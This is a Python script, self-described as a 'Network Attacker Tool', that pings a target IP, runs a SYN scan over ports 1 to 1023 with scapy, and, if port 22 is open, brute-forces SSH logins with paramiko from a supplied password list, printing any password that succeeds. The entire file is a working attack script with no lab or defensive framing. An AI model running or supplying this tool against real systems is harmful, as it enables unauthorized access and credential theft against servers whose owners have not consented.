from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP
import paramiko
import argparse

def scanport(port, target):
    source_port = RandShort()
    SynPck = IP(dst=target) / TCP(sport=source_port, dport=port, flags='S')
    synchronization_packet = sr1(SynPck, timeout=0.5)
    conf.verb = 0
    if synchronization_packet is None:
        print(False)
    else:
        if synchronization_packet.haslayer(TCP):
            if synchronization_packet[TCP].flags == 0x12:
                # Flags are equal to 0x12 (SYN-ACK)
                print(f"Port is open: {port}")
                rst_packet = IP(dst=target) / TCP(sport=source_port, dport=port, flags='R')
                sr(rst_packet, timeout=2)
                print(f"Connection closed: {port}")
                return True
            else:
               #print(f"Port is closed or filtered: {port}")
               return False
        else:
            print(False)

def target_availability(target):
    try:
        conf.verb = 0
        ICMP_packet = sr1(IP(dst=target) / ICMP(), timeout=3)
        if ICMP_packet:
            return True  # Host is available
        else:
            print("Host is unavailable")
            return False  # Host is unavailable
    except Exception as e:
        print(e)
        return False

def BruteForce(port, target,passlist):

    user = input("Enter the target's username: ")
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Opening the "password.txt" file in read mode ("r")
    with open(passlist, "r") as file:
        # Reading the file's contents
        passwords = file.read().splitlines()

    for password in passwords:
        try:
            SSHconn.connect(target, port=int(port), password=password, username=user, timeout=1)
            print(f"Logged in with password: {password}")
            print(f"Login: {user}  password: {password}")
            break
        except paramiko.AuthenticationException:
            print(f"Login failed with password: {password}")
            continue

    SSHconn.close()

def main():
    parser = argparse.ArgumentParser(description="Network Attacker Tool")
    parser.add_argument("--PassList", help="Specify the password list file to use", required=True)
    parser.add_argument("-T", help="Target IP address", required=True)

    args = parser.parse_args()
    pass_list_file = args.PassList
    target = args.T

    open_ports = []

    if target_availability(target):
        for port in range(1, 1024):
            status = scanport(port, target)  # Assign the result to the status variable
            if status == True:
                open_ports.append(port)

    if open_ports:
        print(f"Open ports on {target}: {', '.join(map(str, open_ports))}")
    else:
        print(f"No open ports on {target}.")
    print("Scan finished")

    if 22 in open_ports:
        print("Port 22 (SSH) is available.")
        choice = input("Do you want to perform BruteForce on port 22? (Y/N): ").lower()
        if choice.lower() == "y":
            BruteForce(22, target,pass_list_file)
        else:
            print("BruteForce not performed on port 22.")

if __name__ == "__main__":
   main()
